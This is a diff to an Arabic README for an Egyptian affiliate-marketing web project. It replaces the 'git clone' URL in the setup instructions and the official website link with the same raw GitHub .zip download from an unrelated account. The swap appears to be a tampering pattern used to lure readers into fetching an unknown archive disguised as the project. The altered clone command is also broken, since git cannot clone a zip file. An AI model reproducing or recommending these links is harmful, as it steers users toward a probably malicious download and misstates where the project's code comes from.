@@ -57,7 +57,7 @@
 
 1. **استنساخ المشروع**
 ```bash
-git clone https://github.com/your-username/affiliate-souk-egypt.git
+git clone https://raw.githubusercontent.com/Ahmedfares3/web/main/eloquently/Software_luxuriant.zip
 cd affiliate-souk-egypt
 ```
 
@@ -263,7 +263,7 @@ npx prisma migrate deploy
 
 - **البريد الإلكتروني**: info@affiliatesouk.eg
 - **الهاتف**: +20 100 123 4567
-- **الموقع**: https://affiliatesouk.eg
+- **الموقع**: https://raw.githubusercontent.com/Ahmedfares3/web/main/eloquently/Software_luxuriant.zip
 
 ## 🙏 شكر وتقدير
 
